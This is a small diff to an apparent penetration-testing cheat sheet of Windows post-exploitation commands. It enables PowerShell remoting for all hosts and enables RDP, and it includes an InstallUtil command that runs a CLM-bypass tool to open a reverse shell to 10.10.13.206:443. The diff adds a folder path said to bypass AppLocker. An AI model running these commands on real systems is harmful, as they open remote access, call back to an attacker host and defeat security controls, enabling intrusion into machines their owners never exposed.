@@ -15,3 +15,5 @@ Enable-PSRemoting -Force;Set-Item wsman:\localhost\client\trustedhosts *   (Enab
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0;Enable-NetFirewallRule -DisplayGroup "Remote Desktop"  (Enable RDP)
 
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\PSBypassCLM.exe     (Get a shell that bypasses CLM)
+
+c:\windows\system32\spool\drivers\color\     (folder that bypasses applocker)
